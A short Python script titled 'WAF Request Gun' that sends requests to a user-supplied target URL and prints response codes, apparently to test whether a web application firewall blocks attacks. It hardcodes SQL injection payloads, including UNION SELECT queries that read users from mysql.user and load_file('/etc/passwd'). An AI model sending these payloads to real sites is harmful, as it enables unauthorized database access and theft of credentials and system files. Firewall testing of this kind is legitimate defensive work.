import os
import requests
import json


class iFace:
    def menuHead():
        os.system('cls || clear')
        print('WAF Request Gun v 0.1.6')
        print('-----------------------')
        print('')

    def entURL():
        print('Enter the target URL in the format: "http(s)://example.com"')
        print('')

    def wrongNum():
        print('')
        print('Wrong number!')

    def keyExit():
        print('')
        input('Press any key to exit')

    def keyBack():
        print('')
        input('Press any key to back')


class URL:
    def headers():
        with open('headers.json', 'r') as hfile:
            headers = json.load(hfile)

        return headers

    def urlInput(url):
        if url == '':
            url = input('>> URL: ')
        return url

    def urlSet(url, method, path, headers, params):

        if method == 'get':
            response = requests.get(
                f'{url}{path}', headers = headers, params = params)
        elif method == 'post':
            response = requests.post(
                f'{url}{path}', headers = headers, params=params)

        return response

    def respCode(req):
        print(f'>> Response code is: {req.status_code}')


class Atk:
    def badURL():
        req = URL.urlSet(URL.urlInput(''), 'get', '/n0thing', URL.headers(), '')
        URL.respCode(req)

    def injUnion():
        params = '\'union'
        req = URL.urlSet(URL.urlInput(''), 'get', '/index.php', URL.headers(), params)
        URL.respCode(req)

    def injGetUser():
        params = 'id=-1+union+all+select+1,user,3,4+from+mysql.user--'
        req = URL.urlSet(URL.urlInput(''), 'get', '/sqli_16.php', URL.headers(), params)
        URL.respCode(req)

    def injLoadFile():
        params = 'union+all+select+1,load_file(\'/etc/passwd\'),3,4+from+mysql.user--'
        req = URL.urlSet(URL.urlInput(''), 'get', '/index.php', URL.headers(), params)
        URL.respCode(req)
